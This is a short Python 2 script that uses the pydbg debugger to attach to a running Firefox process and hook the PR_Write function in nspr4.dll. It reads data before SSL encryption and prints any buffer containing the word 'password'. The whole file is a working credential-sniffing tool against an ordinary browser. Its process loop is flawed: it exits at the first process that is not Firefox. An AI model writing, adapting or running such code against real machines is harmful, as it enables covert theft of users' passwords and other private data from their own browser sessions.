'''
Created on 29 Aug 2017

@author: Muhammad Arslan <rslnkrmt2552@gmail.com>
'''

from pydbg import *
from pydbg.defines import *

import utils
import sys

dbg             = pydbg()
found_firefox   = False

pattern = "password"

def ssl_sniff(dbg, args):
    buf = "" #buffer for storing data
    offset = 0
    
    while True:
        byte = dbg.read_process_memory(args[1] + offset, 1)
        
        if byte != "\x00":
            buf += byte
            offset += 1
            continue
        else:
            break
    if pattern in buf:
        print "Pre-Encrypted: %s" % buf
    
    return DBG_CONTINUE


for (pid, name) in dbg.enumerate_processes():
    print "Start"
    if name.lower() == "firefox.exe":
        
        found_firefox = True
        hooks = utils.hook_container()
        
        dbg.attach(pid)
        print "[*] Attaching to firefox.exe with PID: %d" % int(pid)
        
        hook_address = dbg.func_resolve_debugee("nspr4.dll", "PR_Write")
        
        if hook_address:
            hooks.add(dbg, hook_address, 2, ssl_sniff, None)
            print "[*] nspr4.PR_Write hooked at: 0x%08x" % hook_address
            break
        else:
            print "[*] Error: Couldn't resolve hook address."
            sys.exit(-1)
    
    if found_firefox:
        print "[*] Hooks set, continuing process..."
        dbg.run()
    else:
        print "[*] Error: Couldn't find the firefox.exe process."
        sys.exit(-1)
